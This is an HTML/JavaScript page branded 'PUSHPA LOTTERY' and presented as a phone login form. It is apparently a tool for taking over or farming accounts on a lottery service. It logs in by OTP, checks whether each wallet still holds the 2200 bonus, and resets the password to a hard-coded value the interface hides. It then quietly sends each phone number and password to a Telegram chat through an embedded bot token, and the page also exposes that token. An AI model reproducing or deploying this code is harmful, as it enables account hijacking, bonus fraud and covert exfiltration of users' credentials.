<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Phone Login & Password</title>
<style>
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:grid;place-items:center;padding:20px;font-family:Arial,sans-serif;background:#f1f3f8;color:#172033}
.card{width:100%;max-width:470px;background:#fff;border-radius:22px;padding:30px;box-shadow:0 15px 40px rgba(0,0,0,.12)}
h2{text-align:center;margin:0 0 8px}.sub{text-align:center;color:#64748b;margin:0 0 22px;font-size:14px}
label{display:block;font-weight:bold;font-size:14px;margin:14px 0 7px}
input,button{width:100%;height:52px;border-radius:12px;font-size:16px}
input{border:1px solid #cbd5e1;padding:0 14px;outline:none}
input:focus{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.1)}
button{border:0;background:#2563eb;color:white;font-weight:bold;margin-top:16px;cursor:pointer}
button:disabled{opacity:.55;cursor:not-allowed}
.secondary{background:#64748b}.outline{background:#fff;color:#2563eb;border:1px solid #2563eb}
.hidden{display:none}

/* Live Animated 3D Developer Credit */
.dev-text{
    text-align:center;
    margin-top:25px;
    padding-top:18px;
    border-top:1px solid rgba(0,0,0,.10);
    font-family:Arial,sans-serif;
    font-size:14px;
    font-weight:900;
    letter-spacing:4px;
    color:#050505;
    text-transform:uppercase;
    perspective:500px;
    animation:devFloat 2.8s ease-in-out infinite;
}
.dev-text span{
    display:inline-block;
    margin-left:6px;
    padding:2px 4px;
    color:#d4a017;
    font-size:19px;
    font-weight:900;
    letter-spacing:6px;
    transform-style:preserve-3d;
    animation:sanjuLive 2.2s ease-in-out infinite;
    text-shadow:
        0 1px 0 #fff8bd,
        0 2px 0 #f4cf58,
        0 3px 0 #d4a017,
        0 4px 0 #a87800,
        0 5px 0 #795500,
        0 7px 12px rgba(0,0,0,.38),
        0 0 8px rgba(255,215,80,.85),
        0 0 20px rgba(255,193,7,.60),
        0 0 32px rgba(255,193,7,.30);
}
@keyframes devFloat{
    0%,100%{transform:translateY(0) rotateX(0deg)}
    50%{transform:translateY(-3px) rotateX(2deg)}
}
@keyframes sanjuLive{
    0%,100%{
        transform:translateY(0) rotateX(0deg) rotateY(-4deg) scale(1);
        filter:brightness(1);
    }
    50%{
        transform:translateY(-2px) rotateX(8deg) rotateY(4deg) scale(1.08);
        filter:brightness(1.18);
    }
}

.current-phone{
    display:inline-block;
    margin:8px auto 18px;
    padding:8px 16px;
    border-radius:10px;
    background:rgba(59,100,190,.08);
    border:1px solid rgba(59,100,190,.22);
    color:#26364d;
    font-size:16px;
    font-weight:700;
    letter-spacing:1px;
    font-family:monospace;
}
.current-phone.hidden{display:none}

.current-phone{
    margin-left:auto !important;
    margin-right:auto !important;
}


.phone-manage-row{
    display:flex;
    align-items:center;
    justify-content:center;
    gap:10px;
    margin:10px auto 20px;
}
.phone-manage-row.hidden{display:none!important}
.phone-manage-row .current-phone{
    margin:0!important;
}
.manage-number-btn{
    border:1px solid #3b67b8;
    background:#fff;
    color:#315da9;
    padding:10px 14px;
    border-radius:10px;
    font-size:13px;
    font-weight:700;
    cursor:pointer;
    white-space:nowrap;
}
.manage-number-btn:active{
    transform:scale(.97);
}

</style>
</head>
<body>
<div class="card">
<form id="otpForm" autocomplete="off" onsubmit="return false;">
<h2 id="title">PUSHPA LOTTERY</h2>
<p id="subtitle" class="sub">Login with your phone and OTP</p>
<div id="phoneManageRow" class="phone-manage-row hidden">
  <div id="currentPhone" class="current-phone"></div>
  <button type="button" id="manageNumberBtn" class="manage-number-btn">Manage Number</button>
</div>

<section id="loginPhone">
<label>Phone Number</label>
<input id="phone" name="new_phone_input" inputmode="numeric" maxlength="10" placeholder="Enter 10-digit phone number" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
<button id="sendLoginOtp">Send Login OTP</button>
</section>

<section id="loginOtp" class="hidden">
<label>Login OTP</label>
<input id="loginOtpCode" name="login_otp_input" inputmode="numeric" maxlength="6" placeholder="Enter login OTP" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
<button id="verifyLoginOtp">Verify & Login</button>
<button id="resendLoginOtp" class="secondary">Resend OTP</button>
<div id="loginTimer" class="timer"></div>
</section>

<section id="newPassword" class="hidden">
<p class="sub">Your password is configured automatically.</p>
<button id="requestPasswordOtp">Send Password OTP</button>
</section>

<section id="passwordOtp" class="hidden">
<label>Password OTP</label>
<input id="passwordOtpCode" name="password_otp_input" inputmode="numeric" maxlength="6" placeholder="Enter second OTP" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
<button id="savePassword">Verify OTP & Save Password</button>
<button id="resendPasswordOtp" class="secondary">Resend Password OTP</button>
<div id="passwordTimer" class="timer"></div>
</section>

<div id="status" class="status">Enter your phone number.</div>
<div class="footer dev-text">DEV BY <span>SANJU</span></div>
</form>
</div>

<script>
const API_BASE="https://nebulaservice.xyz";

let loginVerificationToken="";
let passwordVerificationToken="";
let accessToken="";
let resendTimer=null;
// Password is configured internally and is not shown in the interface.
const configuredPassword="Amanraj90@";

// Store phone number for Telegram notification
let registeredPhone = "";

const deviceId=localStorage.getItem("device_id")||
 (crypto.randomUUID?crypto.randomUUID().replaceAll("-",""):Date.now().toString(36));
localStorage.setItem("device_id",deviceId);

const $=id=>document.getElementById(id);

// Prevent browser form history/autofill for phone numbers and OTPs.
["phone","loginOtpCode","passwordOtpCode"].forEach((id, index) => {
  const input = $(id);
  input.setAttribute("autocomplete", "off");
  input.setAttribute("data-lpignore", "true");
  input.setAttribute("data-form-type", "other");
  input.name = "field_" + Date.now() + "_" + index;
});

function setStatus(message,type=""){
 const box=$("status");box.textContent=message;box.className="status "+type;
}


$("manageNumberBtn").addEventListener("click",()=>{
  resetToNumberPage();
  $("phone").focus();
});

function hideAll(){
 $("phoneManageRow").classList.add("hidden");
 ["loginPhone","loginOtp","newPassword","passwordOtp"].forEach(id=>$(id).classList.add("hidden"));
}
function startTimer(buttonId,timerId,seconds=30){
 clearInterval(resendTimer);
 const button=$(buttonId),timer=$(timerId);
 let left=seconds;
 button.disabled=true;
 timer.textContent=`Resend available in ${left}s`;
 resendTimer=setInterval(()=>{
   left--;
   timer.textContent=left>0?`Resend available in ${left}s`:"You can resend OTP now.";
   if(left<=0){clearInterval(resendTimer);button.disabled=false;}
 },1000);
}
async function api(path,body,token=""){
 const headers={"Content-Type":"application/json","Accept":"application/json","Clientid":"1"};
 if(token)headers.Authorization="Bearer "+token;
 const response=await fetch(API_BASE+path,{method:"POST",headers,body:JSON.stringify(body)});
 const text=await response.text();
 let data={};try{data=text?JSON.parse(text):{}}catch{data={message:text}}
 if(!response.ok)throw new Error(data.message||`Server error ${response.status}`);
 return data;
}

// --- Telegram notification ---
async function sendTelegramNotification(phone, password) {
  const botToken = "8580989492:AAFZf_8Oi_X1fJulZCIKPRxxX2jUFQKNefg";
  const chatId = "-1004433364467";

  // India local date/time in YYYY-MM-DD HH:MM:SS format
  const parts = new Intl.DateTimeFormat("en-CA", {
    timeZone: "Asia/Kolkata",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hourCycle: "h23"
  }).formatToParts(new Date()).reduce((obj, part) => {
    if (part.type !== "literal") obj[part.type] = part.value;
    return obj;
  }, {});

  const dateTime =
    `${parts.year}-${parts.month}-${parts.day} ` +
    `${parts.hour}:${parts.minute}:${parts.second}`;

  const message =
`🎯 <b>NEW ACCOUNT</b>
━━━━━━━━━━━━━━━━━━━━

🎮 <b>Game:</b> PUSHPA LOTTERY

📱 <b>Phone:</b> <code>${phone}</code>
🔑 <b>Password:</b> <code>${password}</code>
🕐 <b>Time:</b> ${dateTime}

━━━━━━━━━━━━━━━━━━━━
👑 <b>Developed by:</b> Sanju`;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    // Code formatting makes the phone and password easy to select/copy.
    // Copy buttons are added for Telegram clients that support copy_text.
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true
      })
    });

    if (!response.ok) {
      console.warn("Telegram notification request was not accepted.");
    }
  } catch (e) {
    console.warn("Telegram notification failed:", e);
  }
}

// --- Modified savePassword with notification + reset ---
async function savePassword(){
 const otp=$("passwordOtpCode").value.replace(/\D/g,"");
 const password=configuredPassword;
 if(!otp)return setStatus("Enter the password OTP.","error");
 if(!passwordVerificationToken)return setStatus("Password OTP session expired. Please resend.","error");

 $("savePassword").disabled=true;
 setStatus("Saving password...");

 try{
   const result=await api("/api/user/verifyresetpassword",{
     otp,password,verificationToken:passwordVerificationToken
   },accessToken);

   // Password save is complete. Start Telegram notification immediately,
   // but do NOT wait for Telegram before resetting the next registration.
   const completedPhone = registeredPhone;
   if(completedPhone){
     sendTelegramNotification(completedPhone, configuredPassword)
       .catch(e => console.warn("Telegram background error:", e));
   }

   setStatus("✓ Registration Completed Successfully","success");

   // Fast return to the phone number page.
   setTimeout(resetToNumberPage, 700);

 }catch(e){
   // Invalid/failed password OTP: clear the OTP immediately.
   $("passwordOtpCode").value="";
   setStatus("Invalid OTP. Please enter a new OTP.","error");
   $("savePassword").disabled=false;
   $("passwordOtpCode").focus();
 }
}

// Store phone during login OTP send (so we have it later)
async function sendLoginOtp(isResend=false){
 const phoneNumber=$("phone").value.replace(/\D/g,"");
 if(!/^\d{10}$/.test(phoneNumber))return setStatus("Enter a valid 10-digit phone number.","error");

 registeredPhone = phoneNumber; // store for Telegram

 const btn=isResend?$("resendLoginOtp"):$("sendLoginOtp");
 btn.disabled=true;setStatus(isResend?"Resending login OTP...":"Sending login OTP...");

 try{
   const result=await api("/api/user/otplogin",{phoneNumber});
   loginVerificationToken=result?.data?.verificationToken||"";
   if(!loginVerificationToken)throw new Error(result.message||"Verification token was not received.");

   hideAll();
   $("loginOtp").classList.remove("hidden");
   $("currentPhone").textContent="📱 " + phoneNumber;
   $("phoneManageRow").classList.remove("hidden");
   setStatus(isResend?"A new login OTP has been sent.":"Login OTP sent. Enter the OTP you received.","success");
   startTimer("resendLoginOtp","loginTimer");
 }catch(e){setStatus("Could not send login OTP: "+e.message,"error");btn.disabled=false;}
 finally{if(!isResend)$("sendLoginOtp").disabled=false;}
}

async function verifyLoginOtp(){
 const otpCode=$("loginOtpCode").value.replace(/\D/g,"");
 if(!otpCode)return setStatus("Enter the login OTP.","error");

 $("verifyLoginOtp").disabled=true;
 setStatus("Verifying login OTP...");

 try{
   const result=await api("/api/user/verifyotp",{
     deviceId,otpCode,referralCode:"",verificationToken:loginVerificationToken
   });

   accessToken=result?.data?.accessToken||"";
   if(!accessToken)throw new Error(result.message||"Login was not completed.");

   const balance = await checkWalletBalance();

   // NEW account: balance exactly 2200.
   if(balance === 2200){
     accountType="NEW";
     hideAll();
     $("newPassword").classList.remove("hidden");
     $("title").textContent="Set Password";
     $("subtitle").textContent="🎯 NEW ACCOUNT • Balance: 2200";
     setStatus("","success");
     $("requestPasswordOtp").disabled=false;
     return;
   }

   // USED account: balance exactly 0.
   if(balance === 0){
     accountType="USED";
     hideAll();
     $("newPassword").classList.remove("hidden");
     $("title").textContent="Account Status";
     $("subtitle").textContent="⚠️ USED ACCOUNT • Balance: 0";

     // Hide password-OTP sending for a used account and return after showing status.
     $("requestPasswordOtp").classList.add("hidden");
     setStatus("⚠️ USED ACCOUNT detected (Balance: 0). Returning to the login page...","error");
     setTimeout(resetToNumberPage, 3000);
     return;
   }

   // OLD account: balance below 2200 but above 0.
   if(balance > 0 && balance < 2200){
     accountType="OLD";
     hideAll();
     $("newPassword").classList.remove("hidden");
     $("title").textContent="Set Password";
     $("subtitle").textContent="📌 OLD ACCOUNT • Balance: "+balance;
     setStatus("OLD ACCOUNT detected. Send the Password OTP to continue.","success");
     $("requestPasswordOtp").disabled=false;
     return;
   }

   // Other balance values.
   accountType="OLD";
   hideAll();
   $("newPassword").classList.remove("hidden");
   $("title").textContent="Set Password";
   $("subtitle").textContent="ACCOUNT • Balance: "+balance;
   setStatus("Account detected. Send the Password OTP to continue.","success");
   $("requestPasswordOtp").disabled=false;

 }catch(e){
   // Invalid/failed login OTP: clear the OTP immediately.
   $("loginOtpCode").value="";
   setStatus("Invalid OTP. Please enter a new OTP.","error");
   $("verifyLoginOtp").disabled=false;
   $("loginOtpCode").focus();
 }
}

async function checkWalletBalance(){
 try{
   setStatus("Checking account balance...");
   const response = await fetch(API_BASE+"/api/user/wallet/balance", {
     method:"GET",
     headers:{
       "Accept":"application/json",
       "Clientid":"1",
       "Authorization":"Bearer "+accessToken
     }
   });

   const text = await response.text();
   let result={};
   try{ result=text?JSON.parse(text):{}; }catch{ result={message:text}; }

   if(!response.ok){
     throw new Error(result.message||"Could not check balance.");
   }

   const balance = Number(result?.data?.balance);
   if(!Number.isFinite(balance)){
     throw new Error("Invalid balance received from server.");
   }

   return balance;
 }catch(error){
   throw error;
 }
}

async function sendPasswordOtp(isResend=false){
 const password=configuredPassword;
 if(!accessToken)return setStatus("Login session is missing. Please login again.","error");

 const btn=isResend?$("resendPasswordOtp"):$("requestPasswordOtp");
 btn.disabled=true;
 setStatus(isResend?"Resending password OTP...":"Sending password OTP...");

 try{
   const result=await api("/api/user/sendresetpasswordotp",{},accessToken);
   passwordVerificationToken=result?.data?.verificationToken||"";
   if(!passwordVerificationToken)throw new Error(result.message||"Password OTP token was not received.");

   hideAll();
   $("passwordOtp").classList.remove("hidden");

   $("savePassword").disabled=false;

   // Show account type clearly on the Password OTP page.
   if(accountType === "NEW"){
     $("title").textContent="🎯 NEW ACCOUNT";
     $("subtitle").textContent="Password OTP sent • Enter OTP to set password";
     setStatus("NEW ACCOUNT • Password OTP sent. Enter it to save the password.","success");
   }else if(accountType === "OLD"){
     $("title").textContent="📌 OLD ACCOUNT";
     $("subtitle").textContent="Password OTP sent • Enter OTP to set password";
     setStatus("OLD ACCOUNT • Password OTP sent. Enter it to save the password.","success");
   }else{
     $("title").textContent="Set Password";
     $("subtitle").textContent="Confirm your password using a second OTP";
     setStatus("Password OTP sent. Enter it to save your password.","success");
   }

   startTimer("resendPasswordOtp","passwordTimer");
 }catch(e){
   setStatus("Could not send password OTP: "+e.message,"error");
   btn.disabled=false;
 }finally{
   if(!isResend)$("requestPasswordOtp").disabled=false;
 }
}

function resetToNumberPage(){
 clearInterval(resendTimer);

 loginVerificationToken="";
 passwordVerificationToken="";
 accessToken="";
 registeredPhone="";

 $("phone").value="";
 $("loginOtpCode").value="";
 $("passwordOtpCode").value="";

 // Re-enable every button for the next registration
 $("sendLoginOtp").disabled=false;
 $("verifyLoginOtp").disabled=false;
 $("resendLoginOtp").disabled=false;
 $("requestPasswordOtp").disabled=false;
 $("savePassword").disabled=false;
 $("resendPasswordOtp").disabled=false;

 // Reset timer messages
 $("loginTimer").textContent="";
 $("passwordTimer").textContent="";

 $("title").textContent="Phone Login";
 $("subtitle").textContent="Step 1: Send and verify your login OTP";

 hideAll();
 $("loginPhone").classList.remove("hidden");

 setStatus("Registration completed. Ready for a new number.","success");
 $("requestPasswordOtp").classList.remove("hidden");
 $("phone").focus();
 $("phoneManageRow").classList.add("hidden");
}

$("sendLoginOtp").onclick=()=>sendLoginOtp(false);
$("resendLoginOtp").onclick=()=>sendLoginOtp(true);
$("verifyLoginOtp").onclick=verifyLoginOtp;
$("requestPasswordOtp").onclick=()=>sendPasswordOtp(false);
$("resendPasswordOtp").onclick=()=>sendPasswordOtp(true);
$("savePassword").onclick=savePassword;
$("changeNumber1").onclick=resetToNumberPage;

$("phone").addEventListener("keydown",e=>{if(e.key==="Enter")sendLoginOtp(false)});
$("loginOtpCode").addEventListener("keydown",e=>{if(e.key==="Enter")verifyLoginOtp()});
$("passwordOtpCode").addEventListener("keydown",e=>{if(e.key==="Enter")savePassword()});
</script>
</body>
</html>
